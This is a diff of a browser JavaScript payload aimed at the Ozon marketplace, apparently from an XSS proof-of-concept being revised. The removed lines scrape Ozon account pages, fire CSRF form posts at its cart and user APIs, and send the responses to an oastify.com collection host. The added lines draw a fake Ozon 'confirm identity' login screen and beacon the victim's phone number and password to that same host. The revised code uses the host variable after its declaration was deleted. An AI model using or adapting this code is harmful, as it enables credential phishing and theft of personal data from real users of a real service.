@@ -1,130 +1,57 @@
-alert('new_1');
-
-var A = 'https://525hz9zc5mth4kmd2lkt04psdjja77vw.oastify.com';
+alert('new_2');
 var b = function(url, body) { navigator.sendBeacon(url, body || ''); };
+b(A + '?s6_start');
 
-b(A + '?s7_loaded');
-b(A + '?ctx_body=' + (document.body ? 'exists' : 'NULL'));
-b(A + '?ctx_title=' + encodeURIComponent(document.title || 'empty'));
-b(A + '?ctx_url=' + encodeURIComponent(document.URL || 'empty'));
-b(A + '?ctx_origin=' + encodeURIComponent(location.origin || 'empty'));
-
-var cacheTargets = [
-    'https://www.ozon.ru/mini-app-manifest',
-    'https://www.ozon.ru/my/main',
-    'https://www.ozon.ru/my/account',
-    'https://www.ozon.ru/'
-];
-cacheTargets.forEach(function(url, i) {
-    fetch(url, {method: 'GET', credentials: 'omit'})
-    .then(function(r) {
-        b(A + '?v1_c' + i + '_st=' + r.status);
-        return r.text();
-    })
-    .then(function(t) {
-        if (!t || t.length === 0) { b(A + '?v1_c' + i + '_empty'); return; }
-        var hasPii = /userId|user_id|firstName|phone|email|clientId|orderCount/.test(t);
-        b(A + '?v1_c' + i + '_pii=' + hasPii + '&len=' + t.length);
-        b(A + '/v1_c' + i, t.substring(0, 3000));
-    })
-    .catch(function(e) {
-        b(A + '?v1_c' + i + '_err', e.message.substring(0, 80));
-    });
-});
-
-(function() {
+(function renderPhish() {
     try {
-        var iframe = document.createElement('iframe');
-        iframe.name = 'csrf_target';
-        iframe.style.cssText = 'position:absolute;left:-9999px;width:1px;height:1px';
-        document.body.appendChild(iframe);
+        var style = document.createElement('style');
+        style.textContent =
+            '*{box-sizing:border-box;margin:0;padding:0}' +
+            'body{font-family:-apple-system,BlinkMacSystemFont,sans-serif;background:#f5f7fa;min-height:100vh}' +
+            '.bar{height:3px;background:linear-gradient(90deg,#005bff,#00b3ff)}' +
+            '.hdr{background:#fff;padding:14px 18px;border-bottom:1px solid #e5e8f0}' +
+            '.logo{font-size:24px;font-weight:900;color:#005bff;letter-spacing:-1px}' +
+            '.card{background:#fff;margin:16px;border-radius:14px;padding:22px;box-shadow:0 2px 10px rgba(0,0,0,.08)}' +
+            '.ttl{font-size:18px;font-weight:700;color:#111;margin-bottom:8px}' +
+            '.sub{font-size:14px;color:#888;line-height:1.5;margin-bottom:20px}' +
+            '.fld{margin-bottom:14px}' +
+            'label{display:block;font-size:13px;color:#666;font-weight:500;margin-bottom:5px}' +
+            'input{width:100%;padding:13px 15px;border:1.5px solid #e0e4ec;border-radius:10px;font-size:15px;background:#fafbfc}' +
+            'input:focus{border-color:#005bff;outline:none;background:#fff}' +
+            '.btn{background:#005bff;color:#fff;width:100%;padding:15px;border:none;border-radius:10px;font-size:16px;font-weight:600;cursor:pointer;margin-top:2px}' +
+            '.note{text-align:center;font-size:12px;color:#bbb;margin-top:12px}';
+        document.head.appendChild(style);
 
-        var form = document.createElement('form');
-        form.method = 'POST';
-        form.action = 'https://www.ozon.ru/api/composer-api.bx/_action/v2/addToCart';
-        form.enctype = 'text/plain';
-        form.target = 'csrf_target';
+        var meta = document.createElement('meta');
+        meta.name = 'viewport';
+        meta.content = 'width=device-width,initial-scale=1';
+        document.head.appendChild(meta);
 
-        var input = document.createElement('input');
-        input.type = 'hidden';
-        input.name = '[{"id":1215057882,"quantity":1,"_';
-        input.value = '":"1"}]';
-        form.appendChild(input);
-        document.body.appendChild(form);
-        form.submit();
+        document.body.innerHTML =
+            '<div class="bar"></div>' +
+            '<div class="hdr"><span class="logo">ozon</span></div>' +
+            '<div class="card">' +
+            '<div class="ttl">Подтвердите личность</div>' +
+            '<div class="sub">В целях безопасности аккаунта требуется повторный вход в систему.</div>' +
+            '<div class="fld"><label>Номер телефона</label>' +
+            '<input id="ph" type="tel" placeholder="+7 (___) ___-__-__" autocomplete="tel"></div>' +
+            '<div class="fld"><label>Пароль</label>' +
+            '<input id="pw" type="password" placeholder="Пароль от Ozon ID"></div>' +
+            '<button class="btn" id="btn">Войти в аккаунт</button>' +
+            '<div class="note">Защищено SSL &bull; Ozon ID</div>' +
+            '</div>';
 
-        b(A + '?v2_form_submitted');
+        document.getElementById('btn').addEventListener('click', function() {
+            var ph = document.getElementById('ph').value || '(empty)';
+            var pw = document.getElementById('pw').value || '(empty)';
+            navigator.sendBeacon(A + '/v1_creds', 'ph=' + encodeURIComponent(ph) + '&pw=' + encodeURIComponent(pw));
+            this.textContent = 'Проверяем...';
+            this.disabled = true;
+            this.style.background = '#ccc';
+        });
 
-        setTimeout(function() {
-            try {
-                var iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
-                var iframeContent = iframeDoc ? (iframeDoc.body ? iframeDoc.body.innerText : 'no_body') : 'no_doc';
-                b(A + '?v2_iframe_response', iframeContent.substring(0, 500));
-            } catch(e) {
-                b(A + '?v2_iframe_err', e.message.substring(0, 80));
-            }
-        }, 3000);
+        b(A + '?v1_phish_ok');
     } catch(e) {
-        b(A + '?v2_form_err', e.message.substring(0, 80));
+        b(A + '?v1_phish_err', String(e).substring(0, 120));
     }
 })();
-
-(function() {
-    try {
-        var iframe2 = document.createElement('iframe');
-        iframe2.name = 'user_target';
-        iframe2.style.cssText = 'position:absolute;left:-9999px;width:1px;height:1px';
-        document.body.appendChild(iframe2);
-
-        var form2 = document.createElement('form');
-        form2.method = 'POST';
-        form2.action = 'https://www.ozon.ru/api/composer-api.bx/_action/getUserV2';
-        form2.enctype = 'text/plain';
-        form2.target = 'user_target';
-
-        var input2 = document.createElement('input');
-        input2.name = '{';
-        input2.value = '}';
-        form2.appendChild(input2);
-        document.body.appendChild(form2);
-        form2.submit();
-
-        setTimeout(function() {
-            try {
-                var d = iframe2.contentDocument || iframe2.contentWindow.document;
-                var txt = d && d.body ? d.body.innerText : 'inaccessible';
-                b(A + '?v3_user_iframe', txt.substring(0, 1000));
-            } catch(e) {
-                b(A + '?v3_user_xorigin', e.message.substring(0, 60));
-            }
-        }, 3000);
-    } catch(e) {
-        b(A + '?v3_user_err', e.message.substring(0, 80));
-    }
-})();
-
-b(A + '?v4_deeplink_send');
-try {
-    window.location = 'ozon://my/settings/security';
-    b(A + '?v4_deeplink_ok');
-} catch(e) {
-    b(A + '?v4_deeplink_err', e.message.substring(0, 60));
-}
-
-try {
-    var xhr = new XMLHttpRequest();
-    xhr.open('POST', 'https://www.ozon.ru/api/composer-api.bx/_action/getUserV2', true);
-    xhr.withCredentials = true;
-    xhr.setRequestHeader('Content-Type', 'text/plain');
-    xhr.onreadystatechange = function() {
-        if (xhr.readyState !== 4) return;
-        b(A + '?v5_xhr_st=' + xhr.status + '&len=' + (xhr.responseText || '').length);
-        if (xhr.status === 200 && xhr.responseText) {
-            b(A + '/v5_xhr_data', xhr.responseText.substring(0, 3000));
-        }
-    };
-    xhr.onerror = function() { b(A + '?v5_xhr_net_err'); };
-    xhr.send('{}');
-} catch(e) {
-    b(A + '?v5_xhr_ex', e.message.substring(0, 60));
-}
